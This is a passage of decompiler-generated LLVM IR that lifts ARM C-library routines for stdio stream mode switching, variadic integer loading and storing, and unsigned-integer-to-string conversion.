  uselistorder i32 %arg2, { 3, 4, 5, 2, 0, 1, 6, 7 }
  uselistorder i32 %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_17f9c, { 7, 0, 5, 1, 2, 3, 4, 6 }
  uselistorder label %dec_label_pc_17f88, { 0, 2, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17fa4 = load i32, i32* @r4, align 4
  store i32 %v3_17fa4, i32* %stack_var_-8, align 4
  %v3_17fa8 = load i8, i8* %arg1, align 1
  %v4_17fa8 = zext i8 %v3_17fa8 to i32
  store i32 %v4_17fa8, i32* %r2.global-to-local, align 4
  %v2_17fac = add i32 %tmp, 1
  %v3_17fac = inttoptr i32 %v2_17fac to i8*
  %v4_17fac = load i8, i8* %v3_17fac, align 1
  %v5_17fac = zext i8 %v4_17fac to i32
  store i32 %v5_17fac, i32* %r3.global-to-local, align 4
  %v4_17fb0 = mul nuw nsw i32 %v5_17fac, 256
  %v5_17fb0 = or i32 %v4_17fb0, %v4_17fa8
  store i32 %v5_17fb0, i32* %r2.global-to-local, align 4
  %v2_17fb4 = and i32 %v5_17fb0, %arg2
  %v4_17fb4 = icmp eq i32 %v2_17fb4, 0
  store i1 %v4_17fb4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_17fb4, label %dec_label_pc_17fc0, label %dec_label_pc_17fd8

dec_label_pc_17fc0:                               ; preds = %entry
  %v1_17fc0 = and i32 %v5_17fb0, 2176
  %v2_17fc0 = icmp eq i32 %v1_17fc0, 0
  store i1 %v2_17fc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17fc0, label %dec_label_pc_17fc8, label %dec_label_pc_17fec

dec_label_pc_17fc8:                               ; preds = %dec_label_pc_17fc0
  %v2_17fc8 = or i32 %v5_17fb0, %arg2
  store i32 %v2_17fc8, i32* %r2.global-to-local, align 4
  %v3_17fcc = sdiv i32 %v2_17fc8, 256
  store i32 %v3_17fcc, i32* %r3.global-to-local, align 4
  %v1_17fd0 = trunc i32 %v3_17fcc to i8
  store i8 %v1_17fd0, i8* %v3_17fac, align 1
  %v0_17fd4 = load i32, i32* %r2.global-to-local, align 4
  %v1_17fd4 = trunc i32 %v0_17fd4 to i8
  store i8 %v1_17fd4, i8* %arg1, align 1
  %v0_17fd8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17fd8

dec_label_pc_17fd8:                               ; preds = %entry, %dec_label_pc_17fc8
  %v0_18024 = phi i32 [ %tmp, %entry ], [ %v0_17fd8.pre, %dec_label_pc_17fc8 ]
  %v1_17fd8 = inttoptr i32 %v0_18024 to i8*
  %v2_17fd8 = load i8, i8* %v1_17fd8, align 1
  %v3_17fd8 = zext i8 %v2_17fd8 to i32
  store i32 %v3_17fd8, i32* %r2.global-to-local, align 4
  %v1_17fdc = add i32 %v0_18024, 1
  %v2_17fdc = inttoptr i32 %v1_17fdc to i8*
  %v3_17fdc = load i8, i8* %v2_17fdc, align 1
  %v4_17fdc = zext i8 %v3_17fdc to i32
  store i32 %v4_17fdc, i32* %r3.global-to-local, align 4
  %v4_17fe0 = mul nuw nsw i32 %v4_17fdc, 256
  %v1_17fe4 = and i32 %v3_17fd8, 32
  %v2_17fe4 = icmp eq i32 %v1_17fe4, 0
  store i1 %v2_17fe4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17fe4, label %dec_label_pc_18014, label %dec_label_pc_17fec

dec_label_pc_17fec:                               ; preds = %dec_label_pc_17fc0, %dec_label_pc_17fd8
  %v0_17fec = call i32 @__errno_location()
  store i32 %v0_17fec, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_17ff4 = inttoptr i32 %v0_17fec to i32*
  store i32 9, i32* %v2_17ff4, align 4
  br label %dec_label_pc_17ff8

dec_label_pc_17ff8:                               ; preds = %dec_label_pc_1803c, %dec_label_pc_17fec
  %v0_17ff8 = load i32, i32* @r4, align 4
  %v1_17ff8 = inttoptr i32 %v0_17ff8 to i32*
  %v2_17ff8 = load i32, i32* %v1_17ff8, align 4
  %v1_17ffc = or i32 %v2_17ff8, 8
  store i32 %v1_17ffc, i32* %r3.global-to-local, align 4
  %v3_18000 = sdiv i32 %v2_17ff8, 256
  store i32 %v3_18000, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_18008 = trunc i32 %v3_18000 to i8
  %v3_18008 = add i32 %v0_17ff8, 1
  %v4_18008 = inttoptr i32 %v3_18008 to i8*
  store i8 %v1_18008, i8* %v4_18008, align 1
  %v0_1800c = load i32, i32* %r3.global-to-local, align 4
  %v1_1800c = trunc i32 %v0_1800c to i8
  %v2_1800c = load i32, i32* @r4, align 4
  %v3_1800c = inttoptr i32 %v2_1800c to i8*
  store i8 %v1_1800c, i8* %v3_1800c, align 1
  %v2_18010 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18010, i32* @r4, align 4
  ret i32 -1

dec_label_pc_18014:                               ; preds = %dec_label_pc_17fd8
  %tmp15 = urem i8 %v2_17fd8, 4
  %v2_18014 = icmp eq i8 %tmp15, 0
  store i1 %v2_18014, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18014, label %dec_label_pc_18078, label %dec_label_pc_1801c

dec_label_pc_1801c:                               ; preds = %dec_label_pc_18014
  %v1_1801c = and i32 %v3_17fd8, 4
  store i32 %v1_1801c, i32* @r1, align 4
  %v2_1801c = icmp eq i32 %v1_1801c, 0
  store i1 %v2_1801c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1801c, label %dec_label_pc_18024, label %dec_label_pc_18054

dec_label_pc_18024:                               ; preds = %dec_label_pc_1801c
  %v1_18024 = add i32 %v0_18024, 20
  %v2_18024 = inttoptr i32 %v1_18024 to i32*
  %v3_18024 = load i32, i32* %v2_18024, align 4
  store i32 %v3_18024, i32* %r2.global-to-local, align 4
  %v1_18028 = add i32 %v0_18024, 16
  %v2_18028 = inttoptr i32 %v1_18028 to i32*
  %v3_18028 = load i32, i32* %v2_18028, align 4
  store i32 %v3_18028, i32* %r3.global-to-local, align 4
  %v9_1802c = icmp eq i32 %v3_18024, %v3_18028
  store i1 %v9_1802c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1802c, label %dec_label_pc_18034, label %dec_label_pc_1803c

dec_label_pc_18034:                               ; preds = %dec_label_pc_18024
  %v1_18034 = and i32 %v3_17fd8, 2
  %v2_18034 = icmp eq i32 %v1_18034, 0
  store i1 %v2_18034, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18034, label %dec_label_pc_18054, label %dec_label_pc_1803c

dec_label_pc_1803c:                               ; preds = %dec_label_pc_18024, %dec_label_pc_18034
  %v1_1803c = and i32 %v4_17fe0, 1024
  %v2_1803c = icmp eq i32 %v1_1803c, 0
  store i1 %v2_1803c, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_1803c, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_18048 = call i32 @__GI_fseek()
  store i32 %v0_18048, i32* %r0.global-to-local, align 4
  %v2_1804c = icmp eq i32 %v0_18048, 0
  store i1 %v2_1804c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1804c, label %.dec_label_pc_18054_crit_edge, label %dec_label_pc_17ff8

.dec_label_pc_18054_crit_edge:                    ; preds = %dec_label_pc_1803c
  %v0_18054.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18054

dec_label_pc_18054:                               ; preds = %.dec_label_pc_18054_crit_edge, %dec_label_pc_1801c, %dec_label_pc_18034
  %v2_18064 = phi i32 [ %v0_18054.pre, %.dec_label_pc_18054_crit_edge ], [ %v0_18024, %dec_label_pc_1801c ], [ %v0_18024, %dec_label_pc_18034 ]
  %v1_18054 = inttoptr i32 %v2_18064 to i32*
  %v2_18054 = load i32, i32* %v1_18054, align 4
  store i32 %v2_18054, i32* %r3.global-to-local, align 4
  %v1_18058 = add i32 %v2_18064, 8
  %v2_18058 = inttoptr i32 %v1_18058 to i32*
  %v3_18058 = load i32, i32* %v2_18058, align 4
  store i32 %v3_18058, i32* %r1.global-to-local, align 4
  %v1_1805c = and i32 %v2_18054, -4
  store i32 %v1_1805c, i32* %r3.global-to-local, align 4
  %v3_18060 = sdiv i32 %v2_18054, 256
  store i32 %v3_18060, i32* %r2.global-to-local, align 4
  %v1_18064 = trunc i32 %v3_18060 to i8
  %v3_18064 = add i32 %v2_18064, 1
  %v4_18064 = inttoptr i32 %v3_18064 to i8*
  store i8 %v1_18064, i8* %v4_18064, align 1
  %v0_18068 = load i32, i32* %r1.global-to-local, align 4
  %v1_18068 = load i32, i32* @r4, align 4
  %v2_18068 = add i32 %v1_18068, 20
  %v3_18068 = inttoptr i32 %v2_18068 to i32*
  store i32 %v0_18068, i32* %v3_18068, align 4
  %v0_1806c = load i32, i32* %r3.global-to-local, align 4
  %v1_1806c = trunc i32 %v0_1806c to i8
  %v2_1806c = load i32, i32* @r4, align 4
  %v3_1806c = inttoptr i32 %v2_1806c to i8*
  store i8 %v1_1806c, i8* %v3_1806c, align 1
  %v0_18070 = load i32, i32* %r1.global-to-local, align 4
  %v1_18070 = load i32, i32* @r4, align 4
  %v2_18070 = add i32 %v1_18070, 24
  %v3_18070 = inttoptr i32 %v2_18070 to i32*
  store i32 %v0_18070, i32* %v3_18070, align 4
  %v0_18074 = load i32, i32* %r1.global-to-local, align 4
  %v1_18074 = load i32, i32* @r4, align 4
  %v2_18074 = add i32 %v1_18074, 16
  %v3_18074 = inttoptr i32 %v2_18074 to i32*
  store i32 %v0_18074, i32* %v3_18074, align 4
  %v0_18078.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_18078

dec_label_pc_18078:                               ; preds = %dec_label_pc_18014, %dec_label_pc_18054
  %v2_18084 = phi i32 [ %v0_18024, %dec_label_pc_18014 ], [ %v0_18078.pre, %dec_label_pc_18054 ]
  %v1_18078 = inttoptr i32 %v2_18084 to i32*
  %v2_18078 = load i32, i32* %v1_18078, align 4
  %v1_1807c = or i32 %v2_18078, 64
  store i32 %v1_1807c, i32* %r2.global-to-local, align 4
  %v3_18080 = sdiv i32 %v2_18078, 256
  store i32 %v3_18080, i32* %r3.global-to-local, align 4
  %v1_18084 = trunc i32 %v3_18080 to i8
  %v3_18084 = add i32 %v2_18084, 1
  %v4_18084 = inttoptr i32 %v3_18084 to i8*
  store i8 %v1_18084, i8* %v4_18084, align 1
  %v0_18088 = load i32, i32* @r4, align 4
  %v1_18088 = add i32 %v0_18088, 1
  %v2_18088 = inttoptr i32 %v1_18088 to i8*
  %v3_18088 = load i8, i8* %v2_18088, align 1
  %v4_18088 = zext i8 %v3_18088 to i32
  %v3_1808c = mul nuw nsw i32 %v4_18088, 256
  store i32 %v3_1808c, i32* %r3.global-to-local, align 4
  %v1_18090 = and i32 %v3_1808c, 2816
  store i32 %v1_18090, i32* %r0.global-to-local, align 4
  %v2_18090 = icmp eq i32 %v1_18090, 0
  store i1 %v2_18090, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18090, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_18078
  %v2_18094 = add i32 %v0_18088, 12
  %v3_18094 = inttoptr i32 %v2_18094 to i32*
  %v4_18094 = load i32, i32* %v3_18094, align 4
  store i32 %v4_18094, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_18078
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_1809c = load i32, i32* %r2.global-to-local, align 4
  %v1_1809c = trunc i32 %v0_1809c to i8
  %v3_1809c = inttoptr i32 %v0_18088 to i8*
  store i8 %v1_1809c, i8* %v3_1809c, align 1
  %v0_180a0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_180a0, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_180a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_180a0 = load i32, i32* @r4, align 4
  %v3_180a0 = add i32 %v2_180a0, 28
  %v4_180a0 = inttoptr i32 %v3_180a0 to i32*
  store i32 %v1_180a0, i32* %v4_180a0, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_180a4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_180a4, i32* @r4, align 4
  %v8_180a4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_180a4

; uselistorder directives
  uselistorder i32 %v3_1808c, { 1, 0 }
  uselistorder i32 %v3_18080, { 1, 0 }
  uselistorder i32 %v3_18060, { 1, 0 }
  uselistorder i32 %v2_18064, { 0, 2, 1 }
  uselistorder i1 %v2_18014, { 1, 0 }
  uselistorder i32 %v3_18000, { 1, 0 }
  uselistorder i32 %v0_18024, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_17fcc, { 1, 0 }
  uselistorder i32 %v5_17fb0, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_18078, { 1, 0 }
  uselistorder label %dec_label_pc_18054, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1803c, { 1, 0 }
  uselistorder label %dec_label_pc_17fec, { 1, 0 }
  uselistorder label %dec_label_pc_17fd8, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_180a8 = load i32, i32* @r2, align 4
  %v1_180a8 = icmp slt i32 %v0_180a8, 0
  %v0_180ac = load i32, i32* @r0, align 4
  %v1_180b0 = and i32 %v0_180ac, 2048
  %v2_180e4 = icmp eq i32 %v1_180b0, 0
  br i1 %v1_180a8, label %dec_label_pc_180e4, label %dec_label_pc_180b8

dec_label_pc_180b8:                               ; preds = %entry
  br i1 %v2_180e4, label %dec_label_pc_180c0, label %dec_label_pc_180ec

dec_label_pc_180c0:                               ; preds = %dec_label_pc_180b8
  %v7_180c0 = icmp eq i32 %v0_180ac, 256
  %v0_180c4 = load i32, i32* @r1, align 4
  %v1_180c4 = inttoptr i32 %v0_180c4 to i32*
  %v2_180c4 = load i32, i32* %v1_180c4, align 4
  %v2_180c8 = urem i32 %v2_180c4, 256
  %v2_180c8.v2_180c4 = select i1 %v7_180c0, i32 %v2_180c8, i32 %v2_180c4
  br i1 %v7_180c0, label %.thread, label %dec_label_pc_180d0

dec_label_pc_180d0:                               ; preds = %dec_label_pc_180c0
  %v7_180d0 = icmp eq i32 %v0_180ac, 512
  br i1 %v7_180d0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_180d0
  %v4_180d8 = urem i32 %v2_180c8.v2_180c4, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_180d0, %dec_label_pc_180c0, %bb
  %v1_180e0 = phi i32 [ %v2_180c4, %dec_label_pc_180d0 ], [ %v2_180c8, %dec_label_pc_180c0 ], [ %v4_180d8, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_180e0

dec_label_pc_180e4:                               ; preds = %entry
  br i1 %v2_180e4, label %dec_label_pc_180f4, label %dec_label_pc_180ec

dec_label_pc_180ec:                               ; preds = %dec_label_pc_180b8, %dec_label_pc_180e4
  %v0_180ec = load i32, i32* @r1, align 4
  %v1_180ec = inttoptr i32 %v0_180ec to i32*
  %v2_180ec = load i32, i32* %v1_180ec, align 4
  %v3_180ec = add i32 %v0_180ec, 4
  %v4_180ec = inttoptr i32 %v3_180ec to i32*
  %v5_180ec = load i32, i32* %v4_180ec, align 4
  store i32 %v5_180ec, i32* @r1, align 4
  ret i32 %v2_180ec

dec_label_pc_180f4:                               ; preds = %dec_label_pc_180e4
  %v7_180f4 = icmp eq i32 %v0_180ac, 256
  %v0_180f8 = load i32, i32* @r1, align 4
  %v1_180f8 = inttoptr i32 %v0_180f8 to i32*
  %v2_180f8 = load i32, i32* %v1_180f8, align 4
  %v2_180fc = urem i32 %v2_180f8, 256
  %v2_180fc.v2_180f8 = select i1 %v7_180f4, i32 %v2_180fc, i32 %v2_180f8
  br i1 %v7_180f4, label %.thread2, label %dec_label_pc_18104

dec_label_pc_18104:                               ; preds = %dec_label_pc_180f4
  %v7_18104 = icmp eq i32 %v0_180ac, 512
  br i1 %v7_18104, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_18104
  %v4_18108 = mul i32 %v2_180fc.v2_180f8, 65536
  %v4_1810c = sdiv i32 %v4_18108, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18104, %dec_label_pc_180f4, %bb5
  %v0_18110 = phi i32 [ %v2_180f8, %dec_label_pc_18104 ], [ %v2_180fc, %dec_label_pc_180f4 ], [ %v4_1810c, %bb5 ]
  %v3_18110 = ashr i32 %v0_18110, 31
  store i32 %v3_18110, i32* @r1, align 4
  ret i32 %v0_18110

; uselistorder directives
  uselistorder i32 %v0_18110, { 1, 0 }
  uselistorder i32 %v2_180fc, { 1, 0 }
  uselistorder i32 %v2_180f8, { 1, 2, 0 }
  uselistorder i32 %v2_180c8, { 1, 0 }
  uselistorder i32 %v2_180c4, { 1, 2, 0 }
  uselistorder i1 %v2_180e4, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_180ec, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_18118 = icmp eq i32 %arg2, 256
  br i1 %v7_18118, label %dec_label_pc_18144, label %dec_label_pc_18120

dec_label_pc_18120:                               ; preds = %entry
  %v7_18120 = icmp eq i32 %arg2, 2048
  br i1 %v7_18120, label %dec_label_pc_18128, label %dec_label_pc_18130

dec_label_pc_18128:                               ; preds = %dec_label_pc_18120
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_18128 = add i32 %tmp2, 4
  %v6_18128 = inttoptr i32 %v5_18128 to i32*
  store i32 %arg4, i32* %v6_18128, align 4
  ret i32 %tmp2

dec_label_pc_18130:                               ; preds = %dec_label_pc_18120
  %v7_18130 = icmp eq i32 %arg2, 512
  br i1 %v7_18130, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_18130
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_18130
  %v4_18134 = sdiv i32 %arg3, 256
  %v1_18140 = trunc i32 %v4_18134 to i8
  %v4_18140 = add i32 %tmp2, 1
  %v5_18140 = inttoptr i32 %v4_18140 to i8*
  store i8 %v1_18140, i8* %v5_18140, align 1
  br label %dec_label_pc_18144

dec_label_pc_18144:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i8* %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_18144, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_18150 = icmp slt i32 %arg4, 0
  %v2_18150 = icmp eq i32 %arg4, 0
  store i1 %v2_18150, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_18150, label %dec_label_pc_18168, label %dec_label_pc_18188

dec_label_pc_18168:                               ; preds = %entry
  %v1_18168 = icmp slt i32 %arg3, 0
  %v2_18168 = icmp eq i32 %arg3, 0
  store i1 %v2_18168, i1* %cpsr_z.global-to-local, align 1
  %v1_1816c = sub i32 0, %arg4
  store i32 %v1_1816c, i32* %r7.global-to-local, align 4
  br i1 %v1_18168, label %dec_label_pc_18174, label %dec_label_pc_18188

dec_label_pc_18174:                               ; preds = %dec_label_pc_18168
  %v1_18178 = sub i32 0, %arg2
  store i32 %v1_18178, i32* %r5.global-to-local, align 4
  %v2_18178 = icmp eq i32 %arg2, 0
  %v2_1817c = icmp eq i1 %v2_18178, false
  %v5_1817c = sext i1 %v2_1817c to i32
  %v6_1817c = sub i32 %v5_1817c, %arg3
  store i32 %v6_1817c, i32* %r6.global-to-local, align 4
  %v19_1817c = icmp eq i32 %v6_1817c, 0
  store i1 %v19_1817c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18190

dec_label_pc_18188:                               ; preds = %dec_label_pc_18168, %entry
  br label %dec_label_pc_18190

dec_label_pc_18190:                               ; preds = %dec_label_pc_18174, %dec_label_pc_18188
  %storemerge = phi i8 [ 0, %dec_label_pc_18188 ], [ 1, %dec_label_pc_18174 ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_18198 = load i32, i32* %r7.global-to-local, align 4
  %v2_181a0 = udiv i32 -1, %v0_18198
  store i32 %v2_181a0, i32* %fp.global-to-local, align 4
  %v2_181b0 = urem i32 -1, %v0_18198
  %v1_181b4 = add i32 %v2_181b0, 1
  store i32 %v1_181b4, i32* %sb.global-to-local, align 4
  %v9_181b8 = icmp eq i32 %v1_181b4, %v0_18198
  store i1 %v9_181b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_181b8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18190
  %v1_181bc = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_181bc, i32* %sb.global-to-local, align 4
  %v2_181c0 = add i32 %v2_181a0, 1
  store i32 %v2_181c0, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18190, %bb
  %v0_181c4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_181c4, i32* %sl.global-to-local, align 4
  %v0_181c8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_181c8, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_181cc

dec_label_pc_181ccthread-pre-split:               ; preds = %bb21
  %v0_181cc.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_181d4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_181cc

dec_label_pc_181cc:                               ; preds = %dec_label_pc_181ccthread-pre-split, %.thread
  %v0_1823c = phi i32 [ %v0_181d4.pre, %dec_label_pc_181ccthread-pre-split ], [ %v0_18198, %.thread ]
  %v0_181e8 = phi i32 [ %v0_181cc.pr, %dec_label_pc_181ccthread-pre-split ], [ %v0_181c4, %.thread ]
  %v2_181cc = icmp eq i32 %v0_181e8, 0
  store i1 %v2_181cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_181cc, label %dec_label_pc_18238, label %dec_label_pc_181dc

dec_label_pc_181dc:                               ; preds = %dec_label_pc_181cc
  %v2_181dc = urem i32 %v0_181e8, %v0_1823c
  %v2_181ec = udiv i32 %v0_181e8, %v0_1823c
  store i32 %v2_181ec, i32* %sl.global-to-local, align 4
  %v0_181f8 = load i32, i32* %r6.global-to-local, align 4
  %v2_181fc = urem i32 %v0_181f8, %v0_1823c
  %v1_18204 = load i32, i32* %sb.global-to-local, align 4
  %v3_18204 = mul i32 %v1_18204, %v2_181dc
  %v4_18204 = add i32 %v3_18204, %v2_181fc
  store i32 %v4_18204, i32* %r5.global-to-local, align 4
  %v2_1820c = udiv i32 %v0_181f8, %v0_1823c
  %v0_18214 = load i32, i32* %fp.global-to-local, align 4
  %v3_18214 = mul i32 %v0_18214, %v2_181dc
  %v4_18214 = add i32 %v3_18214, %v2_1820c
  %v2_1821c = udiv i32 %v4_18204, %v0_1823c
  %v2_18224 = add i32 %v4_18214, %v2_1821c
  br label %dec_label_pc_18258

dec_label_pc_18238:                               ; preds = %dec_label_pc_181cc
  %v0_18238 = load i32, i32* %r6.global-to-local, align 4
  %v2_18250 = udiv i32 %v0_18238, %v0_1823c
  br label %dec_label_pc_18258

dec_label_pc_18258:                               ; preds = %dec_label_pc_181dc, %dec_label_pc_18238
  %storemerge24 = phi i32 [ %v2_18250, %dec_label_pc_18238 ], [ %v2_18224, %dec_label_pc_181dc ]
  %v0_18274 = phi i32 [ %v2_18250, %dec_label_pc_18238 ], [ %v2_18224, %dec_label_pc_181dc ]
  %v1_18274 = phi i32 [ 0, %dec_label_pc_18238 ], [ %v2_181ec, %dec_label_pc_181dc ]
  %v4_18204.pn = phi i32 [ %v0_18238, %dec_label_pc_18238 ], [ %v4_18204, %dec_label_pc_181dc ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_18260 = urem i32 %v4_18204.pn, %v0_1823c
  %v3_18258 = load i32, i32* %stack_var_0, align 4
  %v2_1825c = icmp ugt i32 %v0_18260, 8
  %v7_1825c = icmp eq i32 %v0_18260, 9
  store i1 %v7_1825c, i1* %cpsr_z.global-to-local, align 1
  %v1_18264 = add i32 %v0_18260, 48
  %v0_1826c = load i32, i32* %r8.global-to-local, align 4
  %v1_1826c = add i32 %v0_1826c, -1
  store i32 %v1_1826c, i32* %r8.global-to-local, align 4
  %v2_18270 = xor i1 %v7_1825c, true
  %v3_18270 = and i1 %v2_1825c, %v2_18270
  %extract.t = trunc i32 %v1_18264 to i8
  br i1 %v3_18270, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_18258
  %v2_18260 = add i32 %v3_18258, %v0_18260
  %extract.t8 = trunc i32 %v2_18260 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_18258, %bb20
  %v0_18278.off0 = phi i8 [ %extract.t, %dec_label_pc_18258 ], [ %extract.t8, %bb20 ]
  %v2_18274 = or i32 %v0_18274, %v1_18274
  %v4_18274 = icmp eq i32 %v2_18274, 0
  store i1 %v4_18274, i1* %cpsr_z.global-to-local, align 1
  %v3_18278 = inttoptr i32 %v1_1826c to i8*
  store i8 %v0_18278.off0, i8* %v3_18278, align 1
  %v0_1827c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1827c, label %dec_label_pc_18280, label %dec_label_pc_181ccthread-pre-split

dec_label_pc_18280:                               ; preds = %bb21
  %v2_18280 = load i8, i8* %stack_var_-40, align 1
  %v2_18284 = icmp eq i8 %v2_18280, 0
  store i1 %v2_18284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18284, label %dec_label_pc_18280..thread2_crit_edge, label %bb22

dec_label_pc_18280..thread2_crit_edge:            ; preds = %dec_label_pc_18280
  %v0_18290.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_18280
  %v3_1828c = load i32, i32* %r8.global-to-local, align 4
  %v4_1828c = add i32 %v3_1828c, -1
  %v5_1828c = inttoptr i32 %v4_1828c to i8*
  store i8 45, i8* %v5_1828c, align 1
  %v6_1828c = load i32, i32* %r8.global-to-local, align 4
  %v7_1828c = add i32 %v6_1828c, -1
  store i32 %v7_1828c, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_18280..thread2_crit_edge, %bb22
  %v0_18290 = phi i32 [ %v0_18290.pre, %dec_label_pc_18280..thread2_crit_edge ], [ %v7_1828c, %bb22 ]
  ret i32 %v0_18290

; uselistorder directives
  uselistorder i32 %v0_18260, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1823c, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
